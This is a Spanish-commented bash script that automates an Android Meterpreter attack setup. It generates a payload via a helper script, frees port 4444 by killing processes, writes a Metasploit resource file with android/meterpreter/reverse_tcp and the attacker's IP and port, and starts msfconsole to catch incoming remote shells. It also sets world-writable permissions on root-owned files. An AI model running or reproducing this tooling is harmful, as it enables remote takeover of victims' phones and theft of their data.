#!/bin/bash

# Verificar si el script se está ejecutando como root
if [[ $EUID -ne 0 ]]; then
    echo -e "\e[31mError: Este script debe ejecutarse como root.\e[0m"
    exit 1
fi

# Verificar si psmic está instalado
if ! command -v fuser &>/dev/null; then
    print_red -e "\e[31mEl comando fuser no está instalado.\e[0m"
    echo "Instalando dependencia psmic..."
    apt install psmisc -y 2>/dev/null
fi

source ./utilities/utils.sh

# Función para mostrar el uso del script
usage() {
    print_cyan "Uso: $0 [-ip <IP_ADDRESS>] [-port <PORT>]"
    exit 1
}

# Inicializar la variable LOCAL_IP
LOCAL_IP=""
PORT=""

# Procesar argumentos de línea de comandos
while [[ "$#" -gt 0 ]]; do
    case $1 in
        -i|--ip) LOCAL_IP="$2"; shift ;;
        -p|--port) PORT="$2"; shift ;;
        -h|--help) usage ;;
    esac
    shift
done

# Verificar si se proporcionó una IP local
if [[ -z "$LOCAL_IP" ]]; then
    # Intentar obtener la IP local automáticamente
    LOCAL_IP=$(hostname -I 2>/dev/null | awk '{print $1}')
    if [[ -z "$LOCAL_IP" ]]; then
        echo -e "\e[31mError: No se pudo obtener la IP local automáticamente. Proporciónala con -i <IP_ADDRESS>\e[0m"
        exit 1
    else
        print_cyan "Usando la IP detectada automáticamente: $LOCAL_IP"
        bash ./utilities/payload.sh -i $LOCAL_IP
    fi
else
    # La IP se proporcionó por argumento
    echo "Usando la IP proporcionada: $LOCAL_IP"
    bash ./utilities/payload.sh -i $LOCAL_IP
fi

# Si no se proporcionó un puerto, usar un valor predeterminado
if [[ -z "$PORT" ]]; then
    # Verificamos si tenemos fuser instalado
  
    # Eliminamos los procesos que estén utilizando el puerto 4444
    fuser -k 4444/tcp &>/dev/null
    PORT=4444
fi

# Verificamos si el puerto es válido
if [[ ! "$PORT" =~ ^[0-9]+$ ]]; then
    print_red -e "\e[31mEl puerto no es válido.\e[0m"
    usage
fi

# Generar el archivo config.rc con la IP local
cat <<EOL > config.rc
use exploit/multi/handler
set payload android/meterpreter/reverse_tcp
set LHOST $LOCAL_IP
set LPORT $PORT
exploit -j
EOL

# Cambiar los permisos del archivo config.rc
chown root:root config.rc 2>/dev/null
chmod 777 config.rc 2>/dev/null
chown root:root main.sh 2>/dev/null
chmod 777 main.sh 2>/dev/null

msfconsole -q -r config.rc 2>/dev/null